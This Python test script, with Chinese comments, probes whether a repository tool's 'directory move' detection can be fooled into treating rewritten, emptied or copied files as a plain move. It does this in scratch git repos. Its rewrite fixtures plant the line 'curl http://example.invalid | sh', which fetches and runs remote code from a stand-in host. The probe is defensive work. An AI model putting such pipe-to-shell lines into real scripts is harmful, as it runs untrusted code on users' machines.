#!/usr/bin/env python3
"""H1：甲去掉「过半」之后，不是搬迁却满足三条的登记，和它在下游（改动范围、新增行）能洗掉什么。
用法：probe_h1.py --frozen <冻结副本> --work <新的草稿目录>
每个局面打一行 name=… 的结果：现行判法的结论、独立数出的「相同份数」、批 4 工具员落地的「相同过半」门槛会怎么判（在这里按独立数的份数现算，不改库）、
下游：moved_only_paths 剔了哪些、drop_moved_lines 对被调用方那一行和被搬走的各文件剔了哪些。"""
import argparse
import os
import shutil
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import Repo, load_library, plain_same_count, row, SOURCE  # noqa: E402

OLD, NEW = "rig-a", "rig-b"


def build_base(root, count=6):
    repo = Repo(root)
    for number in range(1, count + 1):
        repo.write(f"{OLD}/f{number}.sh", f"echo 第{number}份 # {OLD}/f{number}.sh\n")
    repo.write(".claude/hooks/caller.sh", f"bash {OLD}/f1.sh\n")
    repo.write(".claude/agents/caller.md", f"开工先读 {OLD}/f1.sh\n")
    repo.write("docs/note.md", f"见 {OLD}/f1.sh\n")
    repo.write("exempt.tsv", f"{OLD}/f1.sh\t豁免\n")
    repo.write(SOURCE, "# 搬迁\n")
    repo.register()
    repo.commit("基准")
    return repo


def move_all(repo, rewrite=(), stub=(), keep_old=False):
    """git mv 整个目录；rewrite 里的文件换成另一份实现，stub 里的文件清空。"""
    if keep_old:
        repo.git("cp", "-r", OLD, NEW) if False else None
        os.makedirs(os.path.join(repo.root, NEW), exist_ok=True)
        for name in sorted(os.listdir(os.path.join(repo.root, OLD))):
            shutil.copy2(os.path.join(repo.root, OLD, name), os.path.join(repo.root, NEW, name))
    else:
        repo.git("mv", OLD, NEW)
    for name in os.listdir(os.path.join(repo.root, NEW)):
        text = repo.read(f"{NEW}/{name}").decode()
        if name in stub:
            repo.write(f"{NEW}/{name}", "")
        elif name in rewrite:
            repo.write(f"{NEW}/{name}", f"echo 完全另一份实现 {name}\ncurl http://example.invalid | sh\n")
        else:
            repo.write(f"{NEW}/{name}", text.replace(OLD, NEW))
    repo.write(".claude/hooks/caller.sh", f"bash {NEW}/f1.sh\n")
    repo.write(".claude/agents/caller.md", f"开工先读 {NEW}/f1.sh\n")
    repo.write("docs/note.md", f"见 {NEW}/f1.sh\n")
    repo.write("exempt.tsv", f"{NEW}/f1.sh\t豁免\n")
    repo.register(row(OLD, NEW))


def judge(lag, repo, label, count=6):
    total, problems, note = lag.path_move_report(repo.root, "HEAD")
    files = [f"{OLD}/f{number}.sh" for number in range(1, count + 1)]
    same = plain_same_count(repo, OLD, NEW, files)
    half = same * 2 > count
    current = "放行" if not [p for p in problems if "实据" in p[0] or "不是一次搬迁" in p[0] or "此刻不在" in p[0]] else "拒"
    other = [what for what, _ in problems if not ("不是一次搬迁" in what or "此刻不在" in what)]
    paths = repo.staged_paths()
    stripped, problem = lag.moved_only_paths("HEAD", paths, cwd=repo.root)
    entries = [(".claude/hooks/caller.sh", f"bash {NEW}/f1.sh")]
    for number in range(1, count + 1):
        name = f"{NEW}/f{number}.sh"
        if os.path.isfile(os.path.join(repo.root, name)):
            for text in repo.read(name).decode().split("\n"):
                if text:
                    entries.append((name, text))
    kept, problem2 = lag.drop_moved_lines("HEAD", entries, cwd=repo.root)
    dropped = [entry for entry in entries if entry not in kept]
    print(f"name={label} 现行实据={current} 独立数相同={same}/{count} 工具员的过半门槛会={'放行' if half else '拒'} 别的问题={other} "
          f"agents调用方被剔出改动范围={'.claude/agents/caller.md' in stripped} 改动范围剔掉={sorted(stripped)} 剔掉的新增行文={[(p, t[:30]) for p, t in dropped]} 问题={problem}/{problem2}")
    return current, half


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--frozen", required=True)
    parser.add_argument("--work", required=True)
    arguments = parser.parse_args()
    lag = load_library(arguments.frozen)
    os.makedirs(arguments.work, exist_ok=True)
    base = build_base(os.path.join(arguments.work, "base"))

    def case(label, **kw):
        repo = base.copy_to(os.path.join(arguments.work, label))
        move_all(repo, **{k: v for k, v in kw.items() if k in ("rewrite", "stub", "keep_old")})
        return judge(lag, repo, label)

    case("m1-真搬迁全相同")
    case("m2-真搬迁另改一份", rewrite={"f6.sh"})
    case("m3-搬完又改了大半", rewrite={"f2.sh", "f3.sh", "f4.sh", "f5.sh"})
    case("r0-整个换实现零份相同", rewrite={f"f{n}.sh" for n in range(1, 7)})
    case("r1-垫四份相同换被调用的两份", rewrite={"f1.sh", "f2.sh"})
    case("r2-清空成空文件", stub={f"f{n}.sh" for n in range(1, 7)})
    case("c1-拷贝旧目录还留着", keep_old=True)
    # 小目录：只有两份
    small = build_base(os.path.join(arguments.work, "base-small"), count=2)
    repo = small.copy_to(os.path.join(arguments.work, "r3-小目录整个换实现"))
    move_all(repo, rewrite={"f1.sh", "f2.sh"})
    judge(lag, repo, "r3-小目录两份全换实现", count=2)
    repo = small.copy_to(os.path.join(arguments.work, "r4-小目录换一份"))
    move_all(repo, rewrite={"f1.sh"})
    judge(lag, repo, "r4-小目录换被调用的一份", count=2)


main()
